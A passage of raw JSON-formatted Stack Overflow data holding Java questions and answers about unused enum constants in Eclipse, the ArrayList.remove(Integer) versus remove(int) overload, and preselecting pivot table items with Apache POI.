shot\"></a></p>\n"},{"tags":[],"owner":{"account_id":23729554,"reputation":11,"user_id":17749026,"display_name":"UweZ"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640268755,"creation_date":1640268292,"answer_id":70463202,"question_id":43477718,"body_markdown":"Open one enum in &quot;Package Explorer&quot; and click down until you see the constants of this enum. Mark all constants (inside the Package Explorer!) by clicking the first constant, then hold SHIFT key and click the last constant. Now, right click on the marked constants and choose *&quot;Open Call Hierarchy Ctrl+Alt+H&quot;*. \r\n\r\nA &quot;Call Hierarchy&quot; window should open with all marked enums and their use. Enums without call hierarchy information are not used.","title":"Find unused constants in enum class automatically","body":"<p>Open one enum in &quot;Package Explorer&quot; and click down until you see the constants of this enum. Mark all constants (inside the Package Explorer!) by clicking the first constant, then hold SHIFT key and click the last constant. Now, right click on the marked constants and choose <em>&quot;Open Call Hierarchy Ctrl+Alt+H&quot;</em>.</p>\n<p>A &quot;Call Hierarchy&quot; window should open with all marked enums and their use. Enums without call hierarchy information are not used.</p>\n"}],"owner":{"account_id":2497273,"reputation":483,"user_id":2173372,"accept_rate":14,"display_name":"user2173372"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1165,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"answer_count":2,"score":3,"last_activity_date":1640268755,"creation_date":1492533500,"question_id":43477718,"body_markdown":"I have many enum classes in my project which have many constants. Is there a way to find all the constants which are not used anywhere automatically in all the classes in Eclipse?\r\n\r\nFor example:\r\n\r\n    public enum Day {\r\n\t    SUNDAY, MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY\r\n    }\r\n\r\n    public enum Color {\r\n\t    RED, BLUE,GREEN, YELLOW\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n\t\tSystem.out.println(Day.FRIDAY);\r\n\t\tSystem.out.println(Color.GREEN);\r\n\t}\r\n\r\nI want to find all the constants which are not used in my project automatically.\r\nSo here all days except `FRIDAY` and all colors except `GREEN` should be removed.\r\n\r\nNote: Can&#39;t use third party plugins for Eclipse.","title":"Find unused constants in enum class automatically","body":"<p>I have many enum classes in my project which have many constants. Is there a way to find all the constants which are not used anywhere automatically in all the classes in Eclipse?</p>\n\n<p>For example:</p>\n\n<pre><code>public enum Day {\n    SUNDAY, MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY\n}\n\npublic enum Color {\n    RED, BLUE,GREEN, YELLOW\n}\n\npublic static void main(String[] args) {\n    System.out.println(Day.FRIDAY);\n    System.out.println(Color.GREEN);\n}\n</code></pre>\n\n<p>I want to find all the constants which are not used in my project automatically.\nSo here all days except <code>FRIDAY</code> and all colors except <code>GREEN</code> should be removed.</p>\n\n<p>Note: Can't use third party plugins for Eclipse.</p>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":26247,"reputation":33763,"user_id":68105,"accept_rate":69,"display_name":"MK."},"score":2,"creation_date":1293167718,"post_id":4524347,"comment_id":4955799,"body_markdown":"what do you mean &quot;it will not work&quot;?  Computer reboots, I assume?","body":"what do you mean &quot;it will not work&quot;?  Computer reboots, I assume?"},{"owner":{"account_id":209966,"reputation":893,"user_id":461316,"accept_rate":61,"display_name":"user461316"},"score":1,"creation_date":1293167848,"post_id":4524347,"comment_id":4955807,"body_markdown":"By &quot;it will not work&quot;, I mean it does not remove it at all. It ignores it.","body":"By &quot;it will not work&quot;, I mean it does not remove it at all. It ignores it."},{"owner":{"account_id":239936,"reputation":3048,"user_id":509865,"accept_rate":70,"display_name":"Gondim"},"score":0,"creation_date":1293168030,"post_id":4524347,"comment_id":4955816,"body_markdown":"Can you put your code a bit more detailed? A little bit more code..","body":"Can you put your code a bit more detailed? A little bit more code.."},{"owner":{"account_id":26247,"reputation":33763,"user_id":68105,"accept_rate":69,"display_name":"MK."},"score":0,"creation_date":1293168355,"post_id":4524347,"comment_id":4955843,"body_markdown":"so how do you know it doesn&#39;t remove it?","body":"so how do you know it doesn&#39;t remove it?"}],"answers":[{"tags":[],"owner":{"account_id":35502,"reputation":28362,"user_id":100565,"accept_rate":59,"display_name":"MeBigFatGuy"},"down_vote_count":0,"up_vote_count":93,"is_accepted":true,"score":93,"last_activity_date":1293168314,"creation_date":1293168314,"answer_id":4524406,"question_id":4524347,"body_markdown":"The problem is you are passing an Integer to the remove method, and not an int. When you pass an Integer, it assumes that the Integer itself is what you are trying to remove, not the value at that index. Compare the methods\r\n\r\n    remove(Object o)\r\n    remove(int i)\r\n\r\nso do:\r\n\r\n    int keyLocation = reducedFD.indexOf(KeyPlus.get(KEYindex));\r\n    someArrayList.remove(keyLocation);","title":"Java ArrayList.remove() problem","body":"<p>The problem is you are passing an Integer to the remove method, and not an int. When you pass an Integer, it assumes that the Integer itself is what you are trying to remove, not the value at that index. Compare the methods</p>\n\n<pre><code>remove(Object o)\nremove(int i)\n</code></pre>\n\n<p>so do:</p>\n\n<pre><code>int keyLocation = reducedFD.indexOf(KeyPlus.get(KEYindex));\nsomeArrayList.remove(keyLocation);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":117125,"reputation":13617,"user_id":306855,"accept_rate":73,"display_name":"Emil"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1293168343,"creation_date":1293168343,"answer_id":4524410,"question_id":4524347,"body_markdown":" \r\n\r\n        int keyLocation = reducedFD.indexOf(KeyPlus.get(KEYindex)); //Use a primitive int\r\n        someArrayList.remove(keyLocation);\r\n\r\n\r\n","title":"Java ArrayList.remove() problem","body":"<pre><code>    int keyLocation = reducedFD.indexOf(KeyPlus.get(KEYindex)); //Use a primitive int\n    someArrayList.remove(keyLocation);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2047,"reputation":8017,"user_id":2819,"accept_rate":67,"display_name":"Yuval"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1293168465,"creation_date":1293168465,"answer_id":4524417,"question_id":4524347,"body_markdown":"The `List` interface has two `remove()` methods, one that receives an `Object` (and tries to remove this object from the list) and another that receives an `int` (and tries to remove the object whose index is the given int).\r\n\r\nUsually, giving a method an `Integer` parameter results in auto-unboxing, or automatic transform to a primitive `int`. In this case, the compiler will not attempt auto-unboxing, because there&#39;s a perfectly good method there that receives `Object`, and `Integer instanceof Object`... I&#39;m guessing your list is not `List&lt;Integer&gt;`, which is why it fails spectacularly.\r\n\r\nAdding an int to your `Integer` forces auto-unboxing, and the addition results in an `int` - perfect for the other `remove()` method.","title":"Java ArrayList.remove() problem","body":"<p>The <code>List</code> interface has two <code>remove()</code> methods, one that receives an <code>Object</code> (and tries to remove this object from the list) and another that receives an <code>int</code> (and tries to remove the object whose index is the given int).</p>\n\n<p>Usually, giving a method an <code>Integer</code> parameter results in auto-unboxing, or automatic transform to a primitive <code>int</code>. In this case, the compiler will not attempt auto-unboxing, because there's a perfectly good method there that receives <code>Object</code>, and <code>Integer instanceof Object</code>... I'm guessing your list is not <code>List&lt;Integer&gt;</code>, which is why it fails spectacularly.</p>\n\n<p>Adding an int to your <code>Integer</code> forces auto-unboxing, and the addition results in an <code>int</code> - perfect for the other <code>remove()</code> method.</p>\n"},{"tags":[],"owner":{"display_name":"user467871"},"down_vote_count":0,"up_vote_count":14,"is_accepted":false,"score":14,"last_activity_date":1293178596,"creation_date":1293178596,"answer_id":4525096,"question_id":4524347,"body_markdown":"Here is short description :\r\n \r\n    remove(Object o) // remove object\r\n    remove(int index) // remove the object in that index\r\n\r\nif you write `.remove(5)` compiler understands it as a primitive type so as a **index** and remove `index(5).` If you want to remove object you should write `.remove(new Integer(5))`","title":"Java ArrayList.remove() problem","body":"<p>Here is short description :</p>\n\n<pre><code>remove(Object o) // remove object\nremove(int index) // remove the object in that index\n</code></pre>\n\n<p>if you write <code>.remove(5)</code> compiler understands it as a primitive type so as a <strong>index</strong> and remove <code>index(5).</code> If you want to remove object you should write <code>.remove(new Integer(5))</code></p>\n"},{"tags":[],"owner":{"account_id":3644795,"reputation":31,"user_id":3038083,"display_name":"SomeDude"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1390247651,"creation_date":1390247651,"answer_id":21242933,"question_id":4524347,"body_markdown":"Or you could just do:\r\n \r\n     someArrayList.remove(keyLocation + 0);","title":"Java ArrayList.remove() problem","body":"<p>Or you could just do:</p>\n\n<pre><code> someArrayList.remove(keyLocation + 0);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9104387,"reputation":336,"user_id":7054483,"accept_rate":100,"display_name":"Yasser Jarouf"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1508867268,"creation_date":1508864795,"answer_id":46916235,"question_id":4524347,"body_markdown":"You can call this instead of creating an *int*\r\n\r\n    someArrayList.remove(integerKeyLocation.intValue());","title":"Java ArrayList.remove() problem","body":"<p>You can call this instead of creating an <em>int</em></p>\n\n<pre><code>someArrayList.remove(integerKeyLocation.intValue());\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1650790,"reputation":654,"user_id":1521453,"accept_rate":67,"display_name":"Vikrant Goel"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1564046656,"creation_date":1564046656,"answer_id":57198556,"question_id":4524347,"body_markdown":"If you look at `ArrayList` JavaDoc, you&#39;ll find this declaration.\r\n\r\n    public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable\r\n    {\r\n        public E remove(int index){\r\n        .\r\n        .\r\n        .\r\n    }\r\n\r\n`Integer` is different than `int`. Does the following make sense?\r\n\r\n    someArrayList.remove((int)keyLocation);\r\n","title":"Java ArrayList.remove() problem","body":"<p>If you look at <code>ArrayList</code> JavaDoc, you'll find this declaration.</p>\n\n<pre><code>public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable\n{\n    public E remove(int index){\n    .\n    .\n    .\n}\n</code></pre>\n\n<p><code>Integer</code> is different than <code>int</code>. Does the following make sense?</p>\n\n<pre><code>someArrayList.remove((int)keyLocation);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2386002,"reputation":5151,"user_id":2086966,"accept_rate":73,"display_name":"smilyface"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640268685,"creation_date":1640268685,"answer_id":70463276,"question_id":4524347,"body_markdown":"To make it more clear let&#39;s understand with an example. Don&#39;t read again if you get confused on the first read!!\r\n\r\nThink, this is the list (`&lt;object&gt;`) I have:\r\n\r\n    one\r\n    two\r\n    four\r\n    five\r\n    six\r\n\r\n**int**\r\n\r\n    int x = 3;\r\n    remove(x);   //this will remove &quot;five&quot;\r\n\r\n**Integer**\r\n\r\n    Integer x = 3;\r\n    remove(x);   //this will remove nothing\r\n\r\n**String**\r\n\r\n    String x = &quot;three&quot;\r\n    remove(x);   //this will remove nothing (as &quot;three&quot; is not there)\r\n\r\n","title":"Java ArrayList.remove() problem","body":"<p>To make it more clear let's understand with an example. Don't read again if you get confused on the first read!!</p>\n<p>Think, this is the list (<code>&lt;object&gt;</code>) I have:</p>\n<pre><code>one\ntwo\nfour\nfive\nsix\n</code></pre>\n<p><strong>int</strong></p>\n<pre><code>int x = 3;\nremove(x);   //this will remove &quot;five&quot;\n</code></pre>\n<p><strong>Integer</strong></p>\n<pre><code>Integer x = 3;\nremove(x);   //this will remove nothing\n</code></pre>\n<p><strong>String</strong></p>\n<pre><code>String x = &quot;three&quot;\nremove(x);   //this will remove nothing (as &quot;three&quot; is not there)\n</code></pre>\n"}],"owner":{"account_id":209966,"reputation":893,"user_id":461316,"accept_rate":61,"display_name":"user461316"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":53135,"favorite_count":0,"down_vote_count":0,"up_vote_count":22,"accepted_answer_id":4524406,"answer_count":8,"score":22,"last_activity_date":1640268685,"creation_date":1293167418,"question_id":4524347,"body_markdown":"This is part of my code.\r\n\r\n\r\n    Integer keyLocation = reducedFD.indexOf(KeyPlus.get(KEYindex));\r\n    someArrayList.remove(keyLocation);\r\n\r\nSo what I am doing here is I assign keyLocation(the first occurence of a string in the reducedFD arrayList). But when I want to remove from someArrayList the item with that keyLocation, it will not work. \r\n\r\nIf I input manually:\r\n\r\n    someArrayList.remove(0); //Let&#39;s say 0 is the actual keyLocation\r\n\r\nThis actually works.\r\n\r\nWhat is weird is THAT THE FOLLOWING CODE ALSO WORKS:\r\n\r\n    someArrayList.remove(keyLocation + 1);\r\n\r\nAny hints?\r\n\r\nHere is the main loop:\r\n\r\n    for (int KEYindex = 0; KEYindex &lt; KeyPlus.size(); KEYindex++){\r\n   \r\n     Integer keyLocation = reducedFD.indexOf(KeyPlus.get(KEYindex));\r\n    \r\n    if (reducedFD.contains(KeyPlus.get(KEYindex))){\r\n     \r\n     KeyPlus.add(reducedFD.get(keyLocation+1));\r\n     CheckedAttributesPlus.add(KeyPlus.get(KEYindex));\r\n     reducedFD.remove(keyLocation);\r\n     \r\n    }\r\n    }","title":"Java ArrayList.remove() problem","body":"<p>This is part of my code.</p>\n\n<pre><code>Integer keyLocation = reducedFD.indexOf(KeyPlus.get(KEYindex));\nsomeArrayList.remove(keyLocation);\n</code></pre>\n\n<p>So what I am doing here is I assign keyLocation(the first occurence of a string in the reducedFD arrayList). But when I want to remove from someArrayList the item with that keyLocation, it will not work. </p>\n\n<p>If I input manually:</p>\n\n<pre><code>someArrayList.remove(0); //Let's say 0 is the actual keyLocation\n</code></pre>\n\n<p>This actually works.</p>\n\n<p>What is weird is THAT THE FOLLOWING CODE ALSO WORKS:</p>\n\n<pre><code>someArrayList.remove(keyLocation + 1);\n</code></pre>\n\n<p>Any hints?</p>\n\n<p>Here is the main loop:</p>\n\n<pre><code>for (int KEYindex = 0; KEYindex &lt; KeyPlus.size(); KEYindex++){\n\n Integer keyLocation = reducedFD.indexOf(KeyPlus.get(KEYindex));\n\nif (reducedFD.contains(KeyPlus.get(KEYindex))){\n\n KeyPlus.add(reducedFD.get(keyLocation+1));\n CheckedAttributesPlus.add(KeyPlus.get(KEYindex));\n reducedFD.remove(keyLocation);\n\n}\n}\n</code></pre>\n"},{"tags":["java","excel","apache-poi"],"comments":[{"owner":{"account_id":9571720,"reputation":6305,"user_id":7109162,"accept_rate":84,"display_name":"XtremeBaumer"},"score":1,"creation_date":1569509461,"post_id":58119428,"comment_id":102627885,"body_markdown":"So you basically want to filter the names and only display a given value?","body":"So you basically want to filter the names and only display a given value?"},{"owner":{"account_id":16773645,"reputation":33,"user_id":12125527,"display_name":"yesh"},"score":0,"creation_date":1569566645,"post_id":58119428,"comment_id":102645492,"body_markdown":"yes @XtremeBaumer","body":"yes @XtremeBaumer"}],"answers":[{"tags":[],"owner":{"account_id":4853829,"reputation":57305,"user_id":3915431,"display_name":"Axel Richter"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1640268681,"creation_date":1569599597,"answer_id":58137844,"question_id":58119428,"body_markdown":"The pivot table creation in `apache poi` is only rudimentary until now.\r\n\r\n`Apache poi` adds as much pivot field items of type &quot;default&quot; (`&lt;item t=&quot;default&quot;/&gt;`)  as rows are in the data source. This is because they don&#39;t want have a look at the data and so they are assuming as much different values as rows are in the data source. This is fine because Excel will rebuild its pivot cache while opening. \r\n\r\nBut if we want preselect items, then this is not fine. Then we must know what items there are that can be preselected.\r\n\r\nSo we need at least as much items as we want preselect being numbered items: `&lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;&lt;item x=&quot;2&quot;/&gt;...`. And we must build a cache definition which has shared elements for those items.\r\n\r\nTo fulfill that requirement we need determine the unique labels all over the rows in data source. Then for each unique label take the item as numbered item. Then build a cache definition which has shared elements for those items. Then set all not wanted items hidden.\r\n\r\nLet&#39;s have a complete example which creates what you have shown in your question&#39;s pictures. Your code in your question is incomplete, so I had must predict what data you have as data source. Please try avoiding that in further questions and always provide [Minimal, Reproducible Example](https://stackoverflow.com/help/minimal-reproducible-example). Else you will not get answers further.\r\n\r\n    import java.io.FileOutputStream;\r\n    \r\n    import org.apache.poi.ss.*;\r\n    import org.apache.poi.ss.usermodel.*;\r\n    import org.apache.poi.ss.util.*;\r\n    import org.apache.poi.xssf.usermodel.*;\r\n    \r\n    class CreatePivotTablePercentAndFilter {\r\n    \r\n     public static void main(String[] args) throws Exception {\r\n    \r\n      try (Workbook workbook = new XSSFWorkbook(); \r\n           FileOutputStream fileout = new FileOutputStream(&quot;ooxml-pivottable.xlsx&quot;) ) {\r\n    \r\n       Sheet pivotSheet = workbook.createSheet(&quot;Pivot&quot;);\r\n       Sheet dataSheet = workbook.createSheet(&quot;Data&quot;);\r\n    \r\n       setCellData(dataSheet);\r\n    \r\n       AreaReference areaReference = new AreaReference(&quot;A1:D5&quot;, SpreadsheetVersion.EXCEL2007);\r\n       \r\n       XSSFPivotTable pivotTable = ((XSSFSheet)pivotSheet).createPivotTable(areaReference, new CellReference(&quot;A4&quot;), dataSheet);\r\n    \r\n       pivotTable.addRowLabel(0);\r\n     \r\n       pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1);\r\n       pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1,&quot;% of value&quot;);\r\n    \r\n       pivotTable.getCTPivotTableDefinition().getDataFields().getDataFieldArray(1).setShowDataAs(\r\n        org.openxmlformats.schemas.spreadsheetml.x2006.main.STShowDataAs.PERCENT_OF_COL);\r\n       DataFormat dataformat = workbook.createDataFormat();\r\n       short numFmtId = dataformat.getFormat(&quot;0.00%&quot;);\r\n       pivotTable.getCTPivotTableDefinition().getDataFields().getDataFieldArray(1).setNumFmtId(numFmtId);\r\n    \r\n       /*   \r\n       Apache poi adds 5 pivot field items of type &quot;default&quot; (&lt;item t=&quot;default&quot;/&gt;) for each row label here. \r\n       This is because there are 5 rows (A1:D5) and, because they don&#39;t want have a look at the data, \r\n       they are assuming max 5 different values. \r\n       This is fine because Excel will rebuild its pivot cache while opening. \r\n    \r\n       But if we want preselect items, then this is not fine. Then we must know what items there are that can be preselected.\r\n    \r\n       So we need at least as much items as we want preselect being numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;&lt;item x=&quot;2&quot;/&gt;...\r\n       And we must build a cache definition which has shared elements for those items.\r\n    \r\n       To fulfill that we need determine the unique labels in column. \r\n       Then for each unique label take the item as numbered item. \r\n       Then build a cache definition which has shared elements for those items. \r\n       Then set all not wanted items hidden.\r\n       */\r\n    \r\n       //determine unique labels in column 0\r\n       java.util.TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\r\n       for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\r\n        uniqueItems.add(dataSheet.getRow(r).getCell(areaReference.getFirstCell().getCol()).getStringCellValue());\r\n       }\r\n       System.out.println(uniqueItems);\r\n       int i = 0;\r\n       for (String item : uniqueItems) {\r\n        //take the items as numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;&lt;item x=&quot;2&quot;/&gt;\r\n        pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(0).getItems().getItemArray(i).unsetT();\r\n        pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(0).getItems().getItemArray(i).setX((long)i);\r\n        //build a cache definition which has shared elements for those items \r\n        //&lt;sharedItems&gt;&lt;s v=&quot;Jack&quot;/&gt;&lt;s v=&quot;Jane&quot;/&gt;&lt;s v=&quot;Tarzan&quot;/&gt;&lt;s v=&quot;Terk&quot;/&gt;&lt;/sharedItems&gt;\r\n        pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().getCacheFieldArray(0)\r\n        .getSharedItems().addNewS().setV(item);\r\n        i++;\r\n       }\r\n    \r\n       //Now we can predefinite a filter.\r\n       //If the need is selecting multiple items, first MultipleItemSelectionAllowed needs to be set.\r\n       pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(0).setMultipleItemSelectionAllowed(true);\r\n       //Then set H(idden) true for all items which not shall be selected. All except &quot;Jane&quot; in this case.\r\n       i = 0;\r\n       for (String item : uniqueItems) {\r\n        if (!&quot;Jane&quot;.equals(item))\r\n         pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(0).getItems().getItemArray(i).setH(true);\r\n        i++;\r\n       }\r\n    \r\n       workbook.write(fileout);\r\n      }\r\n     }\r\n    \r\n     static void setCellData(Sheet sheet) {\r\n      Row row;\r\n      Cell cell;\r\n      Object[][] data = new Object[][]{\r\n       new Object[]{&quot;Names&quot;, &quot;Values&quot;, &quot;ColC&quot;, &quot;ColD&quot;},\r\n       new Object[]{&quot;Jane&quot;, 10d, &quot;?&quot;, &quot;?&quot;},\r\n       new Object[]{&quot;Tarzan&quot;, 5d, &quot;?&quot;, &quot;?&quot;},\r\n       new Object[]{&quot;Terk&quot;, 10d, &quot;?&quot;, &quot;?&quot;},\r\n       new Object[]{&quot;Jack&quot;, 10d, &quot;?&quot;, &quot;?&quot;}\r\n      };\r\n      for (int r = 0; r &lt; data.length; r++) {\r\n       row = sheet.createRow(r);\r\n       Object[] rowData = data[r];\r\n       for (int c = 0; c &lt; rowData.length; c++) {\r\n        cell = row.createCell(c);\r\n        if (rowData[c] instanceof String) {\r\n         cell.setCellValue((String)rowData[c]);\r\n        } else if (rowData[c] instanceof Double) {\r\n         cell.setCellValue((Double)rowData[c]);\r\n        }\r\n       }\r\n      }\r\n     }\r\n    }","title":"How to set default value for row labels in pivot table using poi","body":"<p>The pivot table creation in <code>apache poi</code> is only rudimentary until now.</p>\n<p><code>Apache poi</code> adds as much pivot field items of type &quot;default&quot; (<code>&lt;item t=&quot;default&quot;/&gt;</code>)  as rows are in the data source. This is because they don't want have a look at the data and so they are assuming as much different values as rows are in the data source. This is fine because Excel will rebuild its pivot cache while opening.</p>\n<p>But if we want preselect items, then this is not fine. Then we must know what items there are that can be preselected.</p>\n<p>So we need at least as much items as we want preselect being numbered items: <code>&lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;&lt;item x=&quot;2&quot;/&gt;...</code>. And we must build a cache definition which has shared elements for those items.</p>\n<p>To fulfill that requirement we need determine the unique labels all over the rows in data source. Then for each unique label take the item as numbered item. Then build a cache definition which has shared elements for those items. Then set all not wanted items hidden.</p>\n<p>Let's have a complete example which creates what you have shown in your question's pictures. Your code in your question is incomplete, so I had must predict what data you have as data source. Please try avoiding that in further questions and always provide <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">Minimal, Reproducible Example</a>. Else you will not get answers further.</p>\n<pre><code>import java.io.FileOutputStream;\n\nimport org.apache.poi.ss.*;\nimport org.apache.poi.ss.usermodel.*;\nimport org.apache.poi.ss.util.*;\nimport org.apache.poi.xssf.usermodel.*;\n\nclass CreatePivotTablePercentAndFilter {\n\n public static void main(String[] args) throws Exception {\n\n  try (Workbook workbook = new XSSFWorkbook(); \n       FileOutputStream fileout = new FileOutputStream(&quot;ooxml-pivottable.xlsx&quot;) ) {\n\n   Sheet pivotSheet = workbook.createSheet(&quot;Pivot&quot;);\n   Sheet dataSheet = workbook.createSheet(&quot;Data&quot;);\n\n   setCellData(dataSheet);\n\n   AreaReference areaReference = new AreaReference(&quot;A1:D5&quot;, SpreadsheetVersion.EXCEL2007);\n   \n   XSSFPivotTable pivotTable = ((XSSFSheet)pivotSheet).createPivotTable(areaReference, new CellReference(&quot;A4&quot;), dataSheet);\n\n   pivotTable.addRowLabel(0);\n \n   pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1);\n   pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1,&quot;% of value&quot;);\n\n   pivotTable.getCTPivotTableDefinition().getDataFields().getDataFieldArray(1).setShowDataAs(\n    org.openxmlformats.schemas.spreadsheetml.x2006.main.STShowDataAs.PERCENT_OF_COL);\n   DataFormat dataformat = workbook.createDataFormat();\n   short numFmtId = dataformat.getFormat(&quot;0.00%&quot;);\n   pivotTable.getCTPivotTableDefinition().getDataFields().getDataFieldArray(1).setNumFmtId(numFmtId);\n\n   /*   \n   Apache poi adds 5 pivot field items of type &quot;default&quot; (&lt;item t=&quot;default&quot;/&gt;) for each row label here. \n   This is because there are 5 rows (A1:D5) and, because they don't want have a look at the data, \n   they are assuming max 5 different values. \n   This is fine because Excel will rebuild its pivot cache while opening. \n\n   But if we want preselect items, then this is not fine. Then we must know what items there are that can be preselected.\n\n   So we need at least as much items as we want preselect being numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;&lt;item x=&quot;2&quot;/&gt;...\n   And we must build a cache definition which has shared elements for those items.\n\n   To fulfill that we need determine the unique labels in column. \n   Then for each unique label take the item as numbered item. \n   Then build a cache definition which has shared elements for those items. \n   Then set all not wanted items hidden.\n   */\n\n   //determine unique labels in column 0\n   java.util.TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\n   for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\n    uniqueItems.add(dataSheet.getRow(r).getCell(areaReference.getFirstCell().getCol()).getStringCellValue());\n   }\n   System.out.println(uniqueItems);\n   int i = 0;\n   for (String item : uniqueItems) {\n    //take the items as numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;&lt;item x=&quot;2&quot;/&gt;\n    pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(0).getItems().getItemArray(i).unsetT();\n    pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(0).getItems().getItemArray(i).setX((long)i);\n    //build a cache definition which has shared elements for those items \n    //&lt;sharedItems&gt;&lt;s v=&quot;Jack&quot;/&gt;&lt;s v=&quot;Jane&quot;/&gt;&lt;s v=&quot;Tarzan&quot;/&gt;&lt;s v=&quot;Terk&quot;/&gt;&lt;/sharedItems&gt;\n    pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().getCacheFieldArray(0)\n    .getSharedItems().addNewS().setV(item);\n    i++;\n   }\n\n   //Now we can predefinite a filter.\n   //If the need is selecting multiple items, first MultipleItemSelectionAllowed needs to be set.\n   pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(0).setMultipleItemSelectionAllowed(true);\n   //Then set H(idden) true for all items which not shall be selected. All except &quot;Jane&quot; in this case.\n   i = 0;\n   for (String item : uniqueItems) {\n    if (!&quot;Jane&quot;.equals(item))\n     pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(0).getItems().getItemArray(i).setH(true);\n    i++;\n   }\n\n   workbook.write(fileout);\n  }\n }\n\n static void setCellData(Sheet sheet) {\n  Row row;\n  Cell cell;\n  Object[][] data = new Object[][]{\n   new Object[]{&quot;Names&quot;, &quot;Values&quot;, &quot;ColC&quot;, &quot;ColD&quot;},\n   new Object[]{&quot;Jane&quot;, 10d, &quot;?&quot;, &quot;?&quot;},\n   new Object[]{&quot;Tarzan&quot;, 5d, &quot;?&quot;, &quot;?&quot;},\n   new Object[]{&quot;Terk&quot;, 10d, &quot;?&quot;, &quot;?&quot;},\n   new Object[]{&quot;Jack&quot;, 10d, &quot;?&quot;, &quot;?&quot;}\n  };\n  for (int r = 0; r &lt; data.length; r++) {\n   row = sheet.createRow(r);\n   Object[] rowData = data[r];\n   for (int c = 0; c &lt; rowData.length; c++) {\n    cell = row.createCell(c);\n    if (rowData[c] instanceof String) {\n     cell.setCellValue((String)rowData[c]);\n    } else if (rowData[c] instanceof Double) {\n     cell.setCellValue((Double)rowData[c]);\n    }\n   }\n  }\n }\n}\n</code></pre>\n"}],"owner":{"account_id":16773645,"reputation":33,"user_id":12125527,"display_name":"yesh"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":926,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":58137844,"answer_count":1,"score":0,"last_activity_date":1640268681,"creation_date":1569509316,"question_id":58119428,"body_markdown":"I am working with excel reports. I need to generate pivot table with some particular field as default value in row labels rather selecting all fields. I am using apache POI.\r\n\r\n[This what I am getting automatically when I load excel sheet][1]\r\n\r\n\r\n[This is what I need][2]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/338lU.png\r\n  [2]: https://i.stack.imgur.com/2YALU.png\r\n\r\n    AreaReference source = new AreaReference(&quot;A1:D5&quot;, SpreadsheetVersion.EXCEL2007);\r\n\t\t    CellReference position = new CellReference(10,0);\r\n\t\t   \r\n\t\t     XSSFPivotTable pivotTable = sheet1.createPivotTable(source, position,wb.getSheet(&quot;1econtent&quot;));\r\n\t\t    \r\n\t\t     pivotTable.addReportFilter(2);\r\n\t\t     pivotTable.addRowLabel(0);\r\n\t\t\t     \r\n\t\t\t pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1);\r\n\t\t\t pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1,&quot;% of value&quot;);\r\n\r\n\t\t\t pivotTable.getCTPivotTableDefinition().getDataFields().getDataFieldArray(1).setShowDataAs(org.openxmlformats.schemas.spreadsheetml.x2006.main.STShowDataAs.PERCENT_OF_COL);\r\n\t\t\t DataFormat dataformat = wb.createDataFormat();\r\n\t\t\t short numFmtId = dataformat.getFormat(&quot;0.00%&quot;);\r\n\t\t\t 